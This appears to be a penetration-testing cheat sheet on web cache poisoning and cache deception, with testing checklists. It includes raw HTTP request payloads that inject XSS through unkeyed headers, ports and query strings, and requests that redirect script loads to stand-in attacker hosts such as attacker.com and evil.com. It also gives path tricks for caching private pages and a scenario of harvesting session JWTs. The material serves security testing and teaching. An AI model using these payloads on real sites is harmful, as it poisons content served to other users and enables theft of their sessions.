# Cache Poisoning and Cache Deception
* In **`web cache poisoning`**, the attacker causes the application to store some `malicious content` in the cache, and this content is served from the cache to other application users.

* In **`web cache deception`**, the attacker causes the application to store some `sensitive content` belonging to another user in the cache, and the attacker then retrieves this content from the cache.

# Cache Poisoning
You need first to identify unkeyed inputs (parameters not needed to appear on the cached request but that change the returned page), see how to abuse this parameter and get the response cached.

## Discovery: Check HTTP headers
### Server Cache Headers:
* **`X-Cache`**: in the response may have the value miss when the request wasn't cached and the value hit when it is cached
* **`Cache-Control`**: indicates if a resource is being cached and when will be the next time the resource will be cached again: Cache-Control: public, max-age=1800
* **`Vary`**: is often used in the response to indicate additional headers that are treated as part of the cache key even if they are normally unkeyed
* **`Age`**: defines the times in seconds the object has been in the proxy cache
* **`Server-Timing: cdn-cache; desc=HIT`**: also indicates that a resource was cached

### Local Cache headers:
* **`Clear-Site-Data`**: Header to indicate the cache that should be removed: Clear-Site-Data: "cache", "cookies"
* **`Expires`**: Contains date/time when the response should expire: Expires: Wed, 21 Oct 2015 07:28:00 GMT
* **`Pragma: no-cache`** same as **`Cache-Control: no-cache`**
* **`Warning`**: The **Warning** general HTTP header contains information about possible problems with the status of the message. More than one Warning header may appear in a response. **`Warning: 110 anderson/1.3.37 "Response is stale"`**

## Discovery: Caching 400 code
If you are thinking that the response is being stored in a cache, you could try to send requests with a bad header, which should be responded to with a status code 400. Then try to access the request normally and if the response is a 400 status code, you know it's vulnerable (and you could even perform a DoS).


## Discovery: Identify and evaluate unkeyed inputs
You could use [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) to brute-force parameters and headers that may be changing the response of the page. For example, a page may be using the header `X-Forwarded-For` to indicate the client to load the script from there:
```javascript
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```

## Exploiting
* A header like **`X-Forwarded-For`** is being reflected in the response unsanitized.
> You can send a basic XSS payload and poison the cache so everybody that accesses the page will be XSSed.
> Note that this will poison a request to `/en?region=uk` not to `/en`
```javascript
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
* Using web cache poisoning to exploit **`cookie-handling`** vulnerabilities
```javascript
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
* Using multiple headers to exploit web cache poisoning vulnerabilities
  * you may find an Open redirect if you set `X-Forwarded-Host` to a **domain controlled by you**
  * `X-Forwarded-Scheme` to http
```javascript
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
* limited Vary header
If you found that the X-Host header is being used as domain name to load a JS resource but the Vary header in the response is indicating User-Agent. Then, you need to find a way to exfiltrate the User-Agent of the victim and poison the cache using that user agent:
```javascript
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```

## Comprehensive Web Cache Poisoning Testing Checklist

### 1. Identify a Suitable Cache Oracle

Objective: Find a page/endpoint that provides feedback on cache behavior.

Steps:

* Look for pages with dynamic content (e.g., redirects, time-sensitive data).

* Check for cache-related headers like `Cache-Status`, `X-Cache`, or `Age`.

* Test response times (cached responses are typically faster).

* Use third-party cache-specific headers (e.g., `Pragma: akamai-x-get-cache-key` to reveal cache keys).

Example:
```html
GET /?param=test HTTP/1.1
Host: example.com
Pragma: akamai-x-get-cache-key
```
If the response includes `X-Cache-Key: example.com/?param=test`, this is a valid cache oracle.

### 2. Probe Cache Key Handling

Objective: Identify transformations in cache keys (e.g., excluded parameters, normalization).

Steps:

* Test unkeyed ports in the Host header:
```html
GET / HTTP/1.1
Host: example.com:1337  # Poisoning attempt
```
If the cached response retains the port in redirects (e.g., `Location: https://example.com:1337/en`), the port is unkeyed.

* Test unkeyed query strings:
```html
GET /?utm_content=payload HTTP/1.1
Host: example.com
```
If the response is cached and serves the same content regardless of `utm_content`, the query string is unkeyed.

* Test parameter filtering:

Send duplicate parameters or malformed syntax (e.g., `/?param=1&param=2`, `/?param[1]=test`).

Check if the cache ignores duplicates or normalizes input.

* Test path normalization:
```html
GET // HTTP/1.1                 # Apache
GET /%2F HTTP/1.1               # Nginx
GET /index.php/xyz HTTP/1.1     # PHP
```
If these paths are treated as `/` by the server but cached separately, path normalization is flawed.

### 3. Exploit Cache Poisoning

### 3.1 Unkeyed Port in Host Header

Exploit: Inject malicious ports to poison redirects or trigger XSS.
```html
GET / HTTP/1.1
Host: example.com:"><svg onload=alert(1)>
```
If the `Location` header reflects the port, users are redirected to a page with XSS.

### 3.2 Unkeyed Query String

Exploit: Poison cached pages with stored XSS.
```html
GET /?utm_content=<script>alert(1)</script> HTTP/1.1
Host: example.com
```
If the query string is unkeyed, all users visiting `/` will execute the payload.

### 3.3 Cache Parameter Cloaking

Exploit: Bypass parameter filtering using parsing quirks.
```html
GET /?utm_content=123?param=alert(1) HTTP/1.1
Host: example.com
```
The cache ignores `utm_content`, but the server treats `param=alert(1)` as a valid parameter.

### 3.4 Normalized Cache Keys

Exploit: Use URL-encoded payloads to bypass sanitization.
```html
GET /?param=%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: example.com
```
If the cache normalizes the key, the decoded payload is stored and executed.

### 3.5 Fat GET Requests

Exploit: Poison caches using GET requests with bodies.
```html
GET /?param=innocent HTTP/1.1
Host: example.com
Content-Length: 13
X-HTTP-Method-Override: POST

param=malicious
```
The cache key uses the request line, but the server processes the body.

### 3.6 Cache Poisoning via HTTP Header Injection

Exploit: Inject headers affecting the cache behavior.
```html
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
If the cache stores responses based on `X-Forwarded-Host`, users receive poisoned content from `attacker.com`.

### 3.7 Cache Poisoning with SSRF

Exploit: Inject requests leading to internal services.
```html
GET /?url=http://localhost/admin HTTP/1.1
Host: example.com
```
If the cache stores responses from internal URLs, attackers can retrieve internal data.

### 4. Poison Internal Caches

Objective: Exploit application-level caches that store reusable fragments.

Steps:

* Identify pages where inputs are reflected across multiple responses (e.g., headers in CSS/JS files).

* Inject payloads into static resources:
```html
GET /style.css?excluded_param=alert(1); HTTP/1.1
Host: example.com
```
If the response includes `alert(1);`, all pages importing `/style.css` will execute the payload.

### 5. Precautionary Measures

* Use controlled domains (e.g., `evil.com`) for payloads to avoid collateral damage.

* Test with harmless payloads first (e.g., `alert(document.domain)`).

* Bust the cache after testing:
```html
GET /?cachebuster=random123 HTTP/1.1
Host: example.com
```
Example Scenario:

* Flaw: Cache excludes the port from the Host header.

Exploit:

* Poison the cache with a malicious port:
```html
GET / HTTP/1.1
Host: example.com:evil.com
```
* Users visiting `example.com` receive the poisoned response:
```html
HTTP/1.1 302 Moved Permanently
Location: https://example.com:evil.com/en
Cache-Status: hit
```



# Cache Deception
### Caching Sensitive Data
Web Cache Deception on PayPal Home Page
1. Normal browsing, visit home : `https://www.example.com/myaccount/home/`
2. Open the malicious link : `https://www.example.com/myaccount/home/malicious.css`
3. The page is displayed as `/home` and the cache is saving the page
4. Open a private tab with the previous URL : `https://www.example.com/myaccount/home/malicous.css`
5. The content of the cache is displayed

## Detection Bypass Techinques (Cache Deception)
* `/profile%2ecss`
* `/profile/;test.css`
* `/profile/!test.css`
* `/profile/.css`
* `/api/messages%0A%0D-test.css`
* `/api/aut/%0A%0D%09session.css`

## CloudFlare Caching
CloudFlare caches the resource when the `Cache-Control` header is set to `public` and `max-age` is greater than `0`.

* The Cloudflare CDN does not cache HTML by default
* Cloudflare only caches based on file extension and not by MIME type: [cloudflare/default-cache-behavior](https://developers.cloudflare.com/cache/about/default-cache-behavior/)

## Web Cache Deception on OpenAI
1. Attacker crafts a dedicated **.css** path of the **`/api/auth/session`** endpoint
2. Attacker distributes the link
3. Victims visit the legitimate link
4. Response is cached
5. Attacker harvests **JWT Credentials**

## Comprehensive Web Cache Deception Testing Checklist

### 1. Identifying Cacheable Endpoints

Example:

* Access `/profile.php/nonexistent.css` and check if the response is cached.

* Use response headers like `X-Cache: HIT` or `Age` to determine caching.

### 2. Exploiting File Name Cache Rules

Example:

* Request `https://target.com/robots.txt` and check if the response is cached.

* Modify the request to `https://target.com/profile/robots.txt` and see if the private page is exposed.

### 3. Testing Static Directory Cache Rules

Example:

* Check `/static/` directories like `/assets/js/main.js` to determine caching behavior.

* Try `/profile/assets/js/main.js` to see if private data gets cached.

### 4. Detecting Normalization Discrepancies

Example:

* Send a request to `/aaa%2f%2e%2e%2findex.html`.

  * If cached, the cache normalizes the path to `/index.html`.

  * If not cached, the cache interprets it as `/profile%2f%2e%2e%2findex.html`.

### 5. Exploiting Normalization Discrepancies

Example:

* If `/profile%2ehtml` is cached but `/profile.html` is private, an attacker may access sensitive content.

### 6. Bypassing Cache-Control Headers

Example:

* Check if `Cache-Control: private` is ignored by the caching server.

* Use headers like `Pragma: no-cache` and see if caching is bypassed.

### 7. Testing Different HTTP Methods

Example:

* Try `HEAD`, `OPTIONS`, or `POST` instead of `GET` and check cache behavior.

* If `HEAD` requests are cached but `GET` is not, sensitive data exposure might be possible.

### 8. Query Parameter Manipulation

Example:

* Test `/dashboard?auth=true` and `/dashboard?auth=false` to check if authentication-sensitive data is cached.

* Try adding `?nocache=randomvalue` to see if cache behavior changes.

### 9. Detecting Cache Key Manipulation

Example:

* If `/user?id=123` is cached but `/user?id=456` returns the same cached response, user data leakage is possible.

### 10. Testing Host Header Injection for Cache Poisoning

Example:

* Modify the `Host` header to `evil.com` and check if it is cached.

* If `https://target.com/profile` is cached under `evil.com/profile`, an attacker can serve malicious content.

### 11. Cache-Based Authentication Bypass

Example:

* Check if `/admin/dashboard` gets cached after an authenticated request.

* Try accessing it without authentication and verify if the cached version is served.

### 12. Testing for Cache Injection

Example:

* Inject `<script>alert(1)</script>` in URL parameters and check if it is cached and served persistently.

* If JavaScript payloads persist, cache-based XSS may be possible.

### 13. Exploiting CDN Behavior

Example:

* Use different CDN edge servers and test variations in caching rules.

* Check if private data is cached on a specific region’s edge server but not others.

### 14. Investigating Vary Header Manipulation

Example:

* Modify `Vary: User-Agent` and see if different user agents receive different cached content.

* If `/profile` caches different responses for different `User-Agent`, information disclosure may occur.

### 15. Testing Multi-Layered Caching Systems

Example:

* Identify if both a CDN (e.g., Cloudflare) and an origin server cache responses.

* Test `/dashboard` via direct origin requests (bypassing CDN) and CDN responses separately.

### Final Notes:

* Use `curl -I -X GET <url>` to inspect headers quickly.

* Leverage Burp Suite to automate cache detection with extensions like Param Miner.

* Always check for `X-Cache`, `Age`, `ETag`, and `Vary` headers.





## Tools
* [PortSwigger/param-miner](https://github.com/PortSwigger/param-miner)
* [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)

